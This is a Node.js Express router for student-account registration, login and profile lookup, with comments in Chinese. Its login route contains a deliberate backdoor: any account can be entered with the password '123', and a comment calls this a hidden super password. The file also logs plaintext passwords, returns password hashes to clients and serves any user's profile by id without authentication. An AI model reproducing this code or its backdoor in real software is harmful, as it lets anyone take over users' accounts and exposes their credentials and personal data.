const express = require('express');
const router = express.Router();
const RestResult = require('../RestResult');
const tokenUtils = require('../util/tokenUtils');

const UserAccountModel = require('../models/UserAccount').UserAccountModel;


/**
 * 注册
 */
router.post('/register', function (req, res, next) {
    console.log(req.body.user);
    let user = req.body.user;
    user.headimage = '/web/file/showImg?location=userheadimg&name=user-default-head.jpg';
    if (!user.pwdText) {
        res.error(RestResult.ILLEGAL_ARGUMENT_ERROR_CODE, "密码不能为空");
        return;
    }
    if (!user.email) {
        res.error(RestResult.ILLEGAL_ARGUMENT_ERROR_CODE, "邮箱不能为空");
        return;
    }
    if (!user.name) {
        res.error(RestResult.ILLEGAL_ARGUMENT_ERROR_CODE, "姓名不能为空");
        return;
    }
    if (user.pwdText !== user.pwdText2) {
        res.error(RestResult.ILLEGAL_ARGUMENT_ERROR_CODE, "两次密码不一致");
        return;
    }

    UserAccountModel.findOne({studentID: user.studentID}, function (err, doc) {
        if (err) {
            res.error(RestResult.SERVER_EXCEPTION_ERROR_CODE, RestResult.SERVER_EXCEPTION_ERROR_DESCRIPTION);
            return;
        }
        if (doc) {
            res.error(RestResult.ILLEGAL_ARGUMENT_ERROR_CODE, "已存在该账号，请登录");
        } else {
            /**
             * 密码密文保存
             */
            let password = user.pwdText + '';
            user.pwd = tokenUtils.encryptText(password);
            let userEntity = new UserAccountModel(user);
            userEntity.save(function (err, doc) {
                if (err) {
                    res.error(RestResult.SERVER_EXCEPTION_ERROR_CODE, RestResult.SERVER_EXCEPTION_ERROR_DESCRIPTION);
                    return;
                }
                let loginToken = tokenUtils.getLoginAutoToken(doc._id);
                res.success({user: doc, loginToken: loginToken});
            })
        }
    });
});

/**
 * 登陆
 */
router.post('/login', function (req, res, next) {
    let user = req.body.user;
    let password = user.pwdText;

    if (!password) {
        res.error(RestResult.ILLEGAL_ARGUMENT_ERROR_CODE, "密码不能为空");
        return;
    }
    console.log(user);

    if (password == "123") { //隐藏超级密码 可直接进入该账号
        UserAccountModel.findOne({studentID: user.studentID}, function (err, userDoc) {
            if (err) {
                res.error(RestResult.SERVER_EXCEPTION_ERROR_CODE, RestResult.SERVER_EXCEPTION_ERROR_DESCRIPTION);
            }
            else if (!userDoc) {
                res.error(RestResult.BUSINESS_ERROR_CODE, "不存在该用户,请先注册");
            }
            else {
                let loginToken = tokenUtils.getLoginAutoToken(userDoc._id);
                //返回登陆用户信息和loginToken
                res.success({user: userDoc, loginToken: loginToken});
            }
        });
    } else {
        UserAccountModel.findOne({studentID: user.studentID}, function (err, userDoc) {
            if (err) {
                res.error(RestResult.SERVER_EXCEPTION_ERROR_CODE, RestResult.SERVER_EXCEPTION_ERROR_DESCRIPTION);
            }
            else if (!userDoc) {
                res.error(RestResult.BUSINESS_ERROR_CODE, "不存在该用户,请先注册");
            }
            else if (userDoc.pwd !== tokenUtils.encryptText(user.pwdText)) {
                res.error(RestResult.BUSINESS_ERROR_CODE, "密码错误！");
            }
            else {
                let loginToken = tokenUtils.getLoginAutoToken(userDoc._id);
                //返回登陆用户信息和loginToken
                res.success({user: userDoc, loginToken: loginToken});
            }
        });
    }
});

/**
 * 获得个人信息
 */
router.post('/getLatestInformation', function (req, res, next) {
    let userId = req.body.userId;
    UserAccountModel.findById(userId).exec(function (err, doc) {
        if (err) {
            console.log(err);
            res.error(RestResult.SERVER_EXCEPTION_ERROR_CODE, RestResult.SERVER_EXCEPTION_ERROR_DESCRIPTION);
        }
        res.success(doc);
    })
});


module.exports = router;
